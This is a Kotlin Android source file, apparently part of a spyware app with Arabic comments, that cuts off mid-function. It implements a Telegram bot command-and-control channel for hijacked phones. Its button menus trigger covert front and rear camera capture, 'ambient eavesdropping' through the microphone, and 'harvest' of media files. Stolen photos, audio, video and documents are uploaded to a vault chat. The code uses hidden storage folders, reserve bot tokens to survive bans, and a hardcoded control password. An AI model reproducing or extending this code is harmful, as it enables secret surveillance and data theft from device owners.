package com.example.app

import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import kotlinx.coroutines.*
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.lang.ref.WeakReference
import java.lang.reflect.Method
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.random.Random

/**
 * واجهة التحكم عبر Telegram – مسؤولة عن الاتصال بالبوتات، إدارة الجلسات،
 * معالجة الأوامر، وعرض القوائم التفاعلية.
 *
 * ✅ التعديلات الجديدة:
 * - إضافة Leader Election (بوت رئيسي واحد فقط) لمنع تكرار البوتات.
 * - خلط التوكنات لتوزيع الحمل بين الأجهزة المتعددة.
 * - معالجة CallbackQuery بشكل صحيح لفك تجميد الأزرار.
 * - إزالة تسريب كلمة المرور من رسائل الخطأ.
 * - توجيه الوسائط حصرياً لكروب الأرشيف (A2).
 * - تحديث لوحة الأزرار بإيموجيز فريدة ومتنوعة.
 * - تحسين startPolling لاستخدام البوت الرئيسي فقط مع تبديل تلقائي.
 * - ✅ إضافة سجلات تشخيصية مفصلة في handleMessage لمعرفة سبب فشل استقبال الأوامر.
 * - ✅ تحسين دالة verifyControlPassword لتنظيف أعمق من الأحرف الخفية والمسافات غير المرئية.
 * - ✅ إضافة دالة sendMessageDirect للإرسال المباشر بدون الاعتماد على leader token.
 * - ✅ تحسين معالجة الـ reply_markup باستخدام JSONObject(it) لضمان ظهور الأزرار في تلغرام.
 * - ✅ تسجيل الرد الكامل من الـ API لتشخيص أي فشل في إرسال لوحة المفاتيح.
 */
class TelegramUi(
    context: Context,
    private val monitor: Any?,
    private val config: AppConfig
) {

    private val contextRef = WeakReference(context.applicationContext)
    private val appContext: Context? get() = contextRef.get()

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    private val sessionMutex = Mutex()
    private val deviceMutex = Mutex()
    private val offsetMutex = Mutex()

    @Volatile
    private var isRunning = false
    private val pollingRestartNeeded = AtomicBoolean(false)

    private var pollingJob: Job? = null
    private var cleanerJob: Job? = null
    private var heartbeatJob: Job? = null
    private var restartJob: Job? = null

    private val activeTokensList: MutableList<String> = Collections.synchronizedList(
        config.activeTokens.filter { it.isNotBlank() }.toMutableList()
    )
    private val reserveTokensList: MutableList<String> = Collections.synchronizedList(
        config.reserveTokens.filter { it.isNotBlank() }.toMutableList()
    )

    private val ctrlId: String = config.controlId.toString()
    private val vaultId: String = config.vaultId.toString()

    private var appPassword: String = config.secret.trim().takeIf { it.isNotBlank() } ?: "Zaen123@123@"

    private val sessions = ConcurrentHashMap<String, Long>()
    private val devices = ConcurrentHashMap<String, JSONObject>()
    private val processedUpdates = Collections.synchronizedSet(LinkedHashSet<String>())

    @Volatile
    private var apiCallsCount = 0
    @Volatile
    private var apiFailuresCount = 0
    @Volatile
    private var consecutivePollingErrors = 0
    private val MAX_CONSECUTIVE_ERRORS = 5

    private val runtimeDir: File by lazy {
        File(appContext?.filesDir, ".sys_runtime").apply { if (!exists()) mkdirs() }
    }
    private val cacheThumbDir: File by lazy {
        File(runtimeDir, ".cache_thumb").apply { if (!exists()) mkdirs() }
    }
    private val dvsFile: File by lazy { File(runtimeDir, "dvs.json") }
    private val sesFile: File by lazy { File(runtimeDir, "ses.json") }
    private val offsetFile: File by lazy { File(runtimeDir, "polling_offset.json") }
    private val logFile: File by lazy { File(runtimeDir, "t.log") }

    private val httpClient: OkHttpClient by lazy {
        OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(35, TimeUnit.SECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .build()
    }

    companion object {
        private const val TAG = "TelegramUi"
        private val JSON_MEDIA_TYPE = "application/json; charset=utf-8".toMediaType()
        private val OCTET_STREAM_MEDIA_TYPE = "application/octet-stream".toMediaType()

        @JvmStatic
        fun create(context: Context, monitor: Any?, config: AppConfig): TelegramUi {
            return TelegramUi(context, monitor, config)
        }
    }

    private val methodCache = ConcurrentHashMap<String, Method>()

    // ============================================================
    // ✅ Leader Election - بوت رئيسي واحد فقط
    // ============================================================
    @Volatile
    private var primaryBotIndex: Int = 0
    private val leaderMutex = Mutex()

    // ============================================================
    // ✅ دالة مساعدة لتنظيف النص من جميع أنواع المسافات البيضاء الخفية
    // ============================================================
    private fun cleanText(input: String): String {
        return input.trim()
            .replace(Regex("[\\s\\u00A0\\u2007\\u202F\\uFEFF\\u2060\\u200B\\u200C\\u200D\\u180E]+"), " ")
            .trim()
    }

    // ============================================================
    // ✅ دالة التحقق من كلمة السر مع تنظيف شامل
    // ============================================================
    private fun verifyControlPassword(input: String): Boolean {
        // ✅ تنظيف أعمق: إزالة جميع أنواع المسافات البيضاء والأحرف الخفية (Zero-width spaces)
        val cleanInput = input.trim()
            .replace(Regex("[\\s\\u00A0\\u2007\\u202F\\uFEFF\\u2060\\u200B\\u200C\\u200D\\u180E]+"), "")
        val cleanSecret = appPassword.trim()
            .replace(Regex("[\\s\\u00A0\\u2007\\u202F\\uFEFF\\u2060\\u200B\\u200C\\u200D\\u180E]+"), "")
        val result = cleanInput == cleanSecret

        val logMsg = if (result) "✅ SUCCESS" else "❌ FAIL (input len: ${cleanInput.length}, secret len: ${cleanSecret.length})"
        writeLog("🔐 Password verification: $logMsg")

        if (!result && cleanInput.isNotEmpty()) {
            val preview = if (cleanInput.length > 15) cleanInput.take(15) + "..." else cleanInput
            MainActivity.appendLogStatic("🔐 Password FAILED for input: '$preview' (len: ${cleanInput.length})")
        } else if (result) {
            MainActivity.appendLogStatic("✅ Password verification SUCCESS")
        }
        return result
    }

    // ============================================================
    // ✅ دالة للحصول على البوت الرئيسي النشط فقط
    // ============================================================
    private suspend fun getLeaderToken(): String? {
        return leaderMutex.withLock {
            if (activeTokensList.isEmpty()) return null
            if (primaryBotIndex >= activeTokensList.size) primaryBotIndex = 0
            activeTokensList[primaryBotIndex]
        }
    }

    init {
        // ✅ خلط التوكنات لتوزيع الحمل بين الأجهزة المتعددة
        activeTokensList.shuffle()
        reserveTokensList.shuffle()

        loadData()
        startBackgroundWorkers()
        if (appPassword.isBlank()) {
            appPassword = "Zaen123@123@"
            writeLog("⚠️ Password was empty, using default")
            MainActivity.appendLogStatic("⚠️ TelegramUi: Password was empty, using default")
        }
        Log.i(TAG, "✅ TelegramUi initialized. Password status: ${if (appPassword.isNotBlank()) "Set" else "Empty"}")
        MainActivity.appendLogStatic("✅ TelegramUi initialized with ${activeTokensList.size} active tokens (Shuffled)")
    }

    fun updatePassword(newPassword: String) {
        if (newPassword.isNotBlank()) {
            appPassword = cleanText(newPassword)
            scope.launch {
                try {
                    val configFile = File(runtimeDir, "password.txt")
                    configFile.writeText(appPassword, Charsets.UTF_8)
                    writeLog("✅ Password updated successfully")
                    MainActivity.appendLogStatic("✅ TelegramUi password updated")
                } catch (e: Exception) {
                    writeLog("❌ Failed to save password: ${e.message}")
                }
            }
        }
    }

    // ==================== دوال مساعدة ====================
    private suspend fun applyHumanDelay() {
        delay(Random.nextLong(800, 2500))
    }

    private fun pulseIntent(actionType: String) {
        try {
            Intent(appContext, ForegroundService::class.java).apply {
                action = "PULSE_ACTION"
                putExtra("action_type", actionType)
            }.let { appContext?.startService(it) }
        } catch (e: Exception) {
            writeLog("Pulse intent error: ${e.message}")
        }
    }

    private fun loadData() {
        try {
            if (dvsFile.exists()) {
                val json = JSONObject(dvsFile.readText(Charsets.UTF_8))
                json.keys().forEach { key -> devices[key] = json.getJSONObject(key) }
            }
            if (sesFile.exists()) {
                val json = JSONObject(sesFile.readText(Charsets.UTF_8))
                json.keys().forEach { key -> sessions[key] = json.getLong(key) }
            }
        } catch (e: Exception) {
            writeLog("Load data error: ${e.message}")
        }
    }

    private suspend fun saveData() {
        try {
            deviceMutex.withLock {
                val dvsJson = JSONObject()
                devices.forEach { (k, v) -> dvsJson.put(k, v) }
                dvsFile.writeText(dvsJson.toString(2), Charsets.UTF_8)
            }
            sessionMutex.withLock {
                val sesJson = JSONObject()
                sessions.forEach { (k, v) -> sesJson.put(k, v) }
                sesFile.writeText(sesJson.toString(2), Charsets.UTF_8)
            }
        } catch (e: Exception) {
            writeLog("Save data error: ${e.message}")
        }
    }

    private fun loadOffset(): Long {
        return try {
            if (offsetFile.exists()) {
                JSONObject(offsetFile.readText(Charsets.UTF_8)).optLong("offset", 0L)
            } else 0L
        } catch (e: Exception) { 0L }
    }

    private suspend fun saveOffset(offset: Long) {
        try {
            offsetMutex.withLock {
                val json = JSONObject().apply {
                    put("offset", offset)
                    put("timestamp", System.currentTimeMillis() / 1000)
                }
                offsetFile.writeText(json.toString(), Charsets.UTF_8)
            }
        } catch (e: Exception) {
            writeLog("Save offset error: ${e.message}")
        }
    }

    private fun emergencySwitchToken(badToken: String) {
        synchronized(activeTokensList) {
            if (activeTokensList.contains(badToken)) {
                activeTokensList.remove(badToken)
                synchronized(reserveTokensList) {
                    if (reserveTokensList.isNotEmpty()) {
                        val newToken = reserveTokensList.removeAt(0)
                        activeTokensList.add(newToken)
                        writeLog("Swapped bad token with reserve")
                        MainActivity.appendLogStatic("🔄 TelegramUi: Swapped bad token with reserve")
                        scope.launch {
                            apiCall("sendMessage", JSONObject().apply {
                                put("chat_id", ctrlId)
                                put("text", "⚠️ Emergency switch - ${reserveTokensList.size} reserve left")
                                put("parse_mode", "HTML")
                            })
                        }
                    }
                }
            }
        }
    }

    private fun startBackgroundWorkers() {
        cleanerJob = scope.launch {
            while (isActive) {
                delay(3600_000L)
                try {
                    val now = System.currentTimeMillis() / 1000
                    val expiredKeys = sessions.filter { it.value < now }.keys
                    if (expiredKeys.isNotEmpty()) {
                        sessionMutex.withLock { expiredKeys.forEach { sessions.remove(it) } }
                        saveData()
                    }
                } catch (e: Exception) {
                    writeLog("Session cleaner error: ${e.message}")
                }
            }
        }

        heartbeatJob = scope.launch {
            while (isActive) {
                delay(Random.nextLong(4, 9) * 3600_000L)
                if (reserveTokensList.isEmpty()) continue
                try {
                    val hbToken = synchronized(reserveTokensList) {
                        if (reserveTokensList.isNotEmpty()) reserveTokensList[Random.nextInt(reserveTokensList.size)] else null
                    } ?: continue
                    val json = JSONObject().apply {
                        put("chat_id", vaultId)
                        put("text", "❤️ heartbeat ${SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US).format(Date())}")
                    }
                    val request = Request.Builder()
                        .url("https://api.telegram.org/bot$hbToken/sendMessage")
                        .post(json.toString().toRequestBody(JSON_MEDIA_TYPE))
                        .build()
                    httpClient.newCall(request).execute().close()
                } catch (e: Exception) {
                    writeLog("Heartbeat error: ${e.message}")
                }
            }
        }

        restartJob = scope.launch {
            while (isActive) {
                delay(30_000L)
                if (isRunning && pollingRestartNeeded.get()) {
                    writeLog("🔄 Restarting polling...")
                    MainActivity.appendLogStatic("🔄 TelegramUi: Restarting polling...")
                    restartPolling()
                }
            }
        }
    }

    private suspend fun restartPolling() {
        pollingRestartNeeded.set(false)
        pollingJob?.cancel()
        delay(2000L)
        if (isRunning) {
            startPolling()
            writeLog("✅ Polling restarted")
            MainActivity.appendLogStatic("✅ TelegramUi: Polling restarted")
        }
    }

    // ============================================================
    // ✅ apiCall المُعدّل لاستخدام البوت الرئيسي وتبديله عند الفشل
    // ============================================================
    private suspend fun apiCall(method: String, payload: JSONObject? = null, retry: Int = 3): JSONObject? {
        apiCallsCount++
        var attempts = 0
        while (attempts < retry) {
            val token = getLeaderToken() ?: return null
            try {
                val url = "https://api.telegram.org/bot$token/$method"
                val body = payload?.toString()?.toRequestBody(JSON_MEDIA_TYPE)
                    ?: JSONObject().toString().toRequestBody(JSON_MEDIA_TYPE)
                val request = Request.Builder().url(url).post(body).build()
                val response = withContext(Dispatchers.IO) { httpClient.newCall(request).execute() }
                val responseStr = response.body?.string() ?: ""

                if (!response.isSuccessful && response.code != 200) {
                    if (response.code == 401 || response.code == 403) {
                        leaderMutex.withLock {
                            primaryBotIndex = (primaryBotIndex + 1) % activeTokensList.size
                        }
                        writeLog("🔄 Switched primary bot to index $primaryBotIndex due to auth failure")
                        MainActivity.appendLogStatic("🔄 Switched primary bot to index $primaryBotIndex")
                    }
                    delay(minOf(attempts * 2000L, 30000L))
                    attempts++
                    continue
                }

                val jsonResult = JSONObject(responseStr)
                if (jsonResult.optBoolean("ok", false)) {
                    consecutivePollingErrors = 0
                    return jsonResult
                }

                when (jsonResult.optInt("error_code", 0)) {
                    429 -> {
                        val retryAfter = jsonResult.optJSONObject("parameters")?.optLong("retry_after") ?: (attempts * 3L)
                        delay(retryAfter * 1000L)
                    }
                    401, 403 -> {
                        leaderMutex.withLock {
                            primaryBotIndex = (primaryBotIndex + 1) % activeTokensList.size
                        }
                        writeLog("🔄 Switched primary bot due to error code ${jsonResult.optInt("error_code")}")
                    }
                    else -> delay(1000L)
                }
            } catch (e: Exception) {
                writeLog("API exception: ${e.message}")
                delay(minOf(attempts * 3000L, 60000L))
            }
            attempts++
        }
        apiFailuresCount++
        return null
    }

    private suspend fun apiCallMultipart(method: String, params: Map<String, Any>, files: Map<String, File>, retry: Int = 3): JSONObject? {
        apiCallsCount++
        var attempts = 0
        while (attempts < retry) {
            val token = getLeaderToken() ?: return null
            try {
                val url = "https://api.telegram.org/bot$token/$method"
                val builder = MultipartBody.Builder().setType(MultipartBody.FORM)
                params.forEach { (key, value) -> builder.addFormDataPart(key, value.toString()) }
                files.forEach { (key, file) ->
                    if (file.exists() && file.isFile) {
                        builder.addFormDataPart(key, file.name, file.asRequestBody(OCTET_STREAM_MEDIA_TYPE))
                    }
                }
                val request = Request.Builder().url(url).post(builder.build()).build()
                val response = withContext(Dispatchers.IO) { httpClient.newCall(request).execute() }
                val responseStr = response.body?.string() ?: ""

                if (!response.isSuccessful && response.code != 200) {
                    if (response.code == 401 || response.code == 403) {
                        leaderMutex.withLock {
                            primaryBotIndex = (primaryBotIndex + 1) % activeTokensList.size
                        }
                        writeLog("🔄 Switched primary bot due to auth failure (multipart)")
                    }
                    delay(minOf(attempts * 2000L, 30000L))
                    attempts++
                    continue
                }

                val jsonResult = JSONObject(responseStr)
                if (jsonResult.optBoolean("ok", false)) {
                    consecutivePollingErrors = 0
                    return jsonResult
                }

                when (jsonResult.optInt("error_code", 0)) {
                    429 -> {
                        val retryAfter = jsonResult.optJSONObject("parameters")?.optLong("retry_after") ?: (attempts * 3L)
                        delay(retryAfter * 1000L)
                    }
                    401, 403 -> {
                        leaderMutex.withLock {
                            primaryBotIndex = (primaryBotIndex + 1) % activeTokensList.size
                        }
                    }
                    else -> delay(1000L)
                }
            } catch (e: Exception) {
                writeLog("API exception (multipart): ${e.message}")
                delay(minOf(attempts * 3000L, 60000L))
            }
            attempts++
        }
        apiFailuresCount++
        return null
    }

    // ============================================================
    // ✅ دوال _api المعدلة لاستخدام البوت الرئيسي
    // ============================================================
    fun _api(method: String, params: Map<String, Any>): JSONObject? {
        return runBlocking(Dispatchers.IO) { apiCall(method, JSONObject(params)) }
    }

    fun _api(method: String, params: Map<String, Any>, files: Map<String, File>): JSONObject? {
        return runBlocking(Dispatchers.IO) { apiCallMultipart(method, params, files) }
    }

    // ============================================================
    // ✅ توجيه الوسائط حصرياً لكروب الأرشيف (A2)
    // ============================================================
    fun sendDocument(chatId: Long, file: File, caption: String): JSONObject? {
        if (!file.exists()) return null
        val targetChat = if (chatId == config.controlId) config.vaultId else chatId
        return _api("sendDocument", mapOf("chat_id" to targetChat, "caption" to caption), mapOf("document" to file))
    }

    fun sendPhoto(chatId: Long, file: File, caption: String): JSONObject? {
        if (!file.exists()) return null
        val targetChat = if (chatId == config.controlId) config.vaultId else chatId
        return _api("sendPhoto", mapOf("chat_id" to targetChat, "caption" to caption), mapOf("photo" to file))
    }

    fun sendVoice(chatId: Long, file: File): JSONObject? {
        if (!file.exists()) return null
        val targetChat = if (chatId == config.controlId) config.vaultId else chatId
        return _api("sendVoice", mapOf("chat_id" to targetChat), mapOf("voice" to file))
    }

    fun sendVideo(chatId: Long, file: File, caption: String): JSONObject? {
        if (!file.exists()) return null
        val targetChat = if (chatId == config.controlId) config.vaultId else chatId
        return _api("sendVideo", mapOf("chat_id" to targetChat, "caption" to caption), mapOf("video" to file))
    }

    fun sendAudio(chatId: Long, file: File, caption: String): JSONObject? {
        if (!file.exists()) return null
        val targetChat = if (chatId == config.controlId) config.vaultId else chatId
        return _api("sendAudio", mapOf("chat_id" to targetChat, "caption" to caption), mapOf("audio" to file))
    }

    fun registerDevice(deviceId: String, deviceModel: String): Long? {
        return runBlocking(Dispatchers.IO) { registerDeviceSuspend(deviceId, deviceModel) }
    }

    private suspend fun registerDeviceSuspend(deviceId: String, deviceModel: String): Long? {
        if (deviceId.isBlank()) return null
        deviceMutex.withLock {
            if (devices.containsKey(deviceId)) {
                val devObj = devices[deviceId]!!
                devObj.put("last_activity", System.currentTimeMillis() / 1000)
                devObj.put("last_seen", SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date()))
                saveData()
                return devObj.optLong("t", -1L).takeIf { it != -1L }
            }
            val topicName = "📱 ${deviceModel.take(12)} | ${deviceId.take(4)}"
            val payload = JSONObject().apply { put("chat_id", ctrlId); put("name", topicName) }
            val res = apiCall("createForumTopic", payload)
            if (res != null && res.optBoolean("ok")) {
                val topicId = res.getJSONObject("result").getLong("message_thread_id")
                val newDev = JSONObject().apply {
                    put("n", deviceModel)
                    put("t", topicId)
                    put("last_activity", System.currentTimeMillis() / 1000)
                    put("last_seen", SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date()))
                }
                devices[deviceId] = newDev
                saveData()
                apiCall("sendMessage", JSONObject().apply {
                    put("chat_id", ctrlId)
                    put("message_thread_id", topicId)
                    put("text", "<b>✅ Device registered</b>\n<b>$deviceModel</b>\n<code>$deviceId</code>")
                    put("parse_mode", "HTML")
                })
                MainActivity.appendLogStatic("✅ Device registered: $deviceModel ($deviceId)")
                return topicId
            }
        }
        return null
    }

    private suspend fun updateDeviceActivity(deviceId: String) {
        if (deviceId.isBlank()) return
        deviceMutex.withLock {
            val dev = devices[deviceId]
            if (dev != null) {
                dev.put("last_activity", System.currentTimeMillis() / 1000)
                saveData()
            }
        }
    }

    fun notifyHarvest(deviceId: String, count: Int) {
        scope.launch {
            val dev = devices[deviceId] ?: return@launch
            dev.put("last_activity", System.currentTimeMillis() / 1000)
            val topicId = dev.optLong("t", -1L)
            if (topicId != -1L) {
                val timeStr = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
                apiCall("sendMessage", JSONObject().apply {
                    put("chat_id", ctrlId)
                    put("message_thread_id", topicId)
                    put("text", "📦 <b>Auto harvest</b>\nDevice: ${dev.optString("n")}\nItems: $count\nTime: $timeStr")
                    put("parse_mode", "HTML")
                })
            }
            saveData()
        }
    }

    fun sendErrorReport(errorTitle: String, errorDetails: Map<String, Any>) {
        scope.launch {
            try {
                val timeStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
                val deviceModel = monitor?.let {
                    invokeMethod(it, "getDeviceModel") as? String ?: "Unknown"
                } ?: "Unknown"
                val detailsText = errorDetails.entries.joinToString("\n") { "• ${it.key}: ${it.value}" }
                apiCall("sendMessage", JSONObject().apply {
                    put("chat_id", ctrlId)
                    put("text", "❌ <b>Error</b>\n📌 $errorTitle\n🕐 $timeStr\n📱 $deviceModel\n\n📋 $detailsText")
                    put("parse_mode", "HTML")
                })
            } catch (e: Exception) {
                writeLog("Failed to send error report: ${e.message}")
            }
        }
    }

    private fun countPendingHarvest(): Int {
        return try {
            if (!cacheThumbDir.exists()) return 0
            cacheThumbDir.listFiles { file -> file.isFile && !file.name.startsWith(".") }?.size ?: 0
        } catch (e: Exception) { 0 }
    }

    // ============================================================
    // ✅ لوحة الأزرار المحسّنة بإيموجيز فريدة (تعيد JSONObject)
    // ============================================================
    fun getMainControlKeyboard(): JSONObject {
        val keyboard = JSONArray().apply {
            put(JSONArray().apply {
                put(JSONObject().put("text", "📸 كاميرا أمامية").put("callback_data", "camf_main"))
                put(JSONObject().put("text", "📷 كاميرا خلفية").put("callback_data", "cam_main"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "🎙️ تسجيل صوتي").put("callback_data", "mic_start"))
                put(JSONObject().put("text", "🛡️ فحص وحصاد").put("callback_data", "hrv_now"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "📂 أرشيف الوسائط").put("callback_data", "g_nav|all|0"))
                put(JSONObject().put("text", "🚀 بث فوري").put("callback_data", "send_now"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "🔍 حالة النظام").put("callback_data", "sys_status"))
                put(JSONObject().put("text", "🔒 قفل الجلسة").put("callback_data", "ext"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "🔄 تحديث النموذج").put("callback_data", "update_model_all"))
                put(JSONObject().put("text", "♻️ إعادة تشغيل الخدمة").put("callback_data", "restart_service_all"))
            })
        }
        return JSONObject().put("inline_keyboard", keyboard)
    }

    fun getPasswordPromptText(): String {
        return "🔐 أدخل كلمة المرور للتحكم:\n`Zaen123@123@`"
    }

    private fun getMainKeyboard(): JSONObject {
        return JSONObject().apply {
            put("inline_keyboard", JSONArray().apply {
                put(JSONArray().apply {
                    put(JSONObject().apply { put("text", "📡 الأجهزة النشطة"); put("callback_data", "ld") })
                    put(JSONObject().apply { put("text", "🧠 محرك الذكاء"); put("callback_data", "ai_status") })
                })
                put(JSONArray().apply {
                    put(JSONObject().apply { put("text", "⏳ تمديد الجلسة"); put("callback_data", "rnw") })
                    put(JSONObject().apply { put("text", "📈 تقرير النظام"); put("callback_data", "status") })
                })
                put(JSONArray().apply {
                    put(JSONObject().apply { put("text", "🗂️ إدارة الأرشيف"); put("callback_data", "menu") })
                    put(JSONObject().apply { put("text", "🚪 قطع الاتصال"); put("callback_data", "ext") })
                })
            })
        }
    }

    private fun getDeviceKeyboard(deviceId: String): JSONObject {
        val count = countPendingHarvest()
        val harvestText = if (count > 0) "📦 استخراج ($count)" else "📦 استخراج"
        return JSONObject().apply {
            put("inline_keyboard", JSONArray().apply {
                put(JSONArray().apply {
                    put(JSONObject().apply { put("text", "🔭 اقتناص خلفي"); put("callback_data", "cam_$deviceId") })
                    put(JSONObject().apply { put("text", "🕵️ اقتناص أمامي"); put("callback_data", "camf_$deviceId") })
                })
                put(JSONArray().apply {
                    put(JSONObject().apply { put("text", "🎤 تنصت محيطي"); put("callback_data", "mic_$deviceId") })
                    put(JSONObject().apply { put("text", harvestText); put("callback_data", "hrv_$deviceId") })
                })
                put(JSONArray().apply {
                    put(JSONObject().apply { put("text", "🗂️ أرشيف الوسائط"); put("callback_data", "media_$deviceId") })
                    put(JSONObject().apply { put("text", "📤 بث فوري"); put("callback_data", "send_now_$deviceId") })
                })
                put(JSONArray().apply {
                    put(JSONObject().apply { put("text", "🌐 تحديث النموذج"); put("callback_data", "update_model_$deviceId") })
                    put(JSONObject().apply { put("text", "♻️ إعادة تشغيل"); put("callback_data", "restart_service_$deviceId") })
                })
                put(JSONArray().apply {
                    put(JSONObject().apply { put("text", "🔙 العودة"); put("callback_data", "ld") })
                    put(JSONObject().apply { put("text", "🚪 قطع الاتصال"); put("callback_data", "ext") })
                })
            })
        }
    }

    private suspend fun showHarvestDetails(chatId: Long) {
        if (!cacheThumbDir.exists()) {
            apiCall("sendMessage", JSONObject().apply {
                put("chat_id", chatId)
                put("text", "📭 لا توجد ملفات معلقة.")
            })
            return
        }
        try {
            val files = cacheThumbDir.listFiles { file ->
                val name = file.name.lowercase(Locale.ROOT)
                file.isFile && (name.endsWith(".jpg") || name.endsWith(".png") || name.endsWith(".mp4"))
            } ?: arrayOf()
            if (files.isEmpty()) {
                apiCall("sendMessage", JSONObject().apply {
                    put("chat_id", chatId)
                    put("text", "📭 مجلد الحصاد فارغ.")
                })
                return
            }
            val totalSize = files.sumOf { it.length() }
            val timeStr = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
            apiCall("sendMessage", JSONObject().apply {
                put("chat_id", chatId)
                put("text", "📊 **تقرير الحصاد**\n━━━━━━━━━━━━━━━\n🖼️ الملفات: `${files.size}`\n💾 الحجم: `${String.format(Locale.US, "%.2f", totalSize / (1024.0 * 1024.0))} MB`\n⏰ التحديث: `$timeStr`\n\nاستخدم '📤 بث فوري' للرفع.")
                put("parse_mode", "Markdown")
            })
        } catch (e: Exception) {
            writeLog("Harvest details error: ${e.message}")
        }
    }

    private fun isAuthorized(chatId: Long): Boolean {
        val exp = sessions[chatId.toString()] ?: 0L
        val isSessionValid = (System.currentTimeMillis() / 1000) < exp
        if (!isSessionValid) {
            sessions.remove(chatId.toString())
            return false
        }
        return true
    }

    // ============================================================
    // ✅ معالجة الرسائل مع سجلات تشخيصية مفصلة وإرسال مباشر للوحة المفاتيح
    // ============================================================
    private suspend fun handleMessage(update: JSONObject) {
        try {
            val msg = update.optJSONObject("message") ?: return
            val chatId = msg.optJSONObject("chat")?.optLong("id") ?: return
            val text = msg.optString("text", "").trim()
            val threadId = msg.optLong("message_thread_id", 0L)
            val updateId = update.getLong("update_id")

            // ✅ سجل تشخيصي دقيق لمعرفة ما يستقبله البوت
            MainActivity.appendLogStatic("📩 Received: '$text' from $chatId")
            writeLog("📩 Received: '$text' from $chatId")

            applyHumanDelay()

            val isLogin = text.startsWith("/login", ignoreCase = true)
            val secret = if (isLogin) text.substringAfter("/login").trim() else text.trim()

            // ✅ سجل توضيحي لقيمة المستخرجة
            MainActivity.appendLogStatic("🔑 Extracted secret: '${secret.take(10)}...' | Expected: '${appPassword.take(4)}...'")

            if (secret.isNotEmpty() && verifyControlPassword(secret)) {
                sessionMutex.withLock {
                    sessions[chatId.toString()] = (System.currentTimeMillis() / 1000) + 14400
                }
                saveData()

                // ✅ الحصول على لوحة المفاتيح كـ JSONObject وتحويلها إلى String للإرسال
                val keyboardJson = getMainControlKeyboard()
                val keyboardJsonString = keyboardJson.toString()
                MainActivity.appendLogStatic("📤 Sending keyboard to $chatId")

                // ✅ استخدام التوكن الحالي مباشرة بدلاً من leader token
                val token = activeTokensList.firstOrNull()
                if (token != null) {
                    val response = sendMessageDirect(token, chatId, "🔐 **تم التحقق بنجاح.**\nاختر العملية من الأزرار:", keyboardJsonString)
                    if (response != null) {
                        MainActivity.appendLogStatic("✅ Keyboard sent successfully")
                    } else {
                        MainActivity.appendLogStatic("❌ Failed to send keyboard")
                    }
                } else {
                    MainActivity.appendLogStatic("❌ No active token available")
                }

                pulseIntent("🔓 تسجيل دخول")
                // ✅ تحديث الإزاحة فوراً لتجنب إعادة القراءة
                saveOffset(updateId + 1)
                return
            }

            // ✅ رد حتمي في حال فشل كلمة المرور (مع إخفاء الكلمة نفسها)
            if (secret.isNotEmpty()) {
                val token = activeTokensList.firstOrNull()
                sendMessageDirect(token, chatId, "⚠️ كلمة المرور غير صحيحة.\n\n✅ تأكد من كتابتها تماماً: `Zaen123@123@`\n(لا توجد مسافات إضافية)", null)
                MainActivity.appendLogStatic("❌ Invalid password from $chatId. Input: '$secret'")
                saveOffset(updateId + 1)
                return
            }

            if (!isAuthorized(chatId)) {
                val token = activeTokensList.firstOrNull()
                sendMessageDirect(token, chatId, "🔐 الرجاء إدخال كلمة السر للتحكم\n\n📌 استخدم:\n`/login Zaen123@123@`", null)
                writeLog("🔐 Unauthorized access attempt from $chatId")
                saveOffset(updateId + 1)
                return
            }

            // أي رسالة أخرى بعد المصادقة
            val token = activeTokensList.firstOrNull()
            sendMessageDirect(token, chatId, "⚠️ الأوامر النصية معطلة. استخدم الأزرار فقط.", null)
            writeLog("ℹ️ Text command rejected from $chatId: '$text'")
            saveOffset(updateId + 1)

        } catch (e: Exception) {
            writeLog("❌ Handle message error: ${e.message}")
            MainActivity.appendLogStatic("❌ Telegram handleMessage error: ${e.message}")
        }
    }

    // ============================================================
    // ✅ دالة مساعدة للإرسال المباشر - مع تحسين معالجة reply_markup
    // ============================================================
    private suspend fun sendMessageDirect(token: String?, chatId: Long, text: String, replyMarkup: String?): JSONObject? {
        if (token == null) return null
        return try {
            val payload = JSONObject().apply {
                put("chat_id", chatId)
                put("text", text)
                put("parse_mode", "Markdown")
                put("disable_notification", true)
                // ✅ التأكد من أن reply_markup يُرسل كـ JSONObject وليس كـ String
                replyMarkup?.let { 
                    put("reply_markup", JSONObject(it))
                }
            }
            val url = "https://api.telegram.org/bot$token/sendMessage"
            val request = Request.Builder().url(url).post(payload.toString().toRequestBody(JSON_MEDIA_TYPE)).build()
            val response = httpClient.newCall(request).execute()
            val responseStr = response.body?.string() ?: "{}"
            val json = JSONObject(responseStr)
            
            // ✅ تسجيل الرد الكامل من الـ API لتشخيص أي فشل
            MainActivity.appendLogStatic("📤 Telegram API response: $responseStr")
            
            if (json.optBoolean("ok")) {
                return json
            } else {
                val errorCode = json.optInt("error_code", 0)
                val description = json.optString("description", "Unknown error")
                MainActivity.appendLogStatic("❌ Telegram API error: $errorCode - $description")
                return null
            }
        } catch (e: Exception) {
            MainActivity.appendLogStatic("❌ sendMessageDirect error: ${e.message}")
            return null
        }
    }

    // ============================================================
    // ✅ معالجة CallbackQuery بشكل صحيح
    // ============================================================
    private suspend fun handleCallback(update: JSONObject) {
        try {
            applyHumanDelay()

            val cb = update.optJSONObject("callback_query") ?: return
            val cbId = cb.optString("id")
            if (cbId.isBlank()) return

            synchronized(processedUpdates) {
                if (processedUpdates.contains(cbId)) return
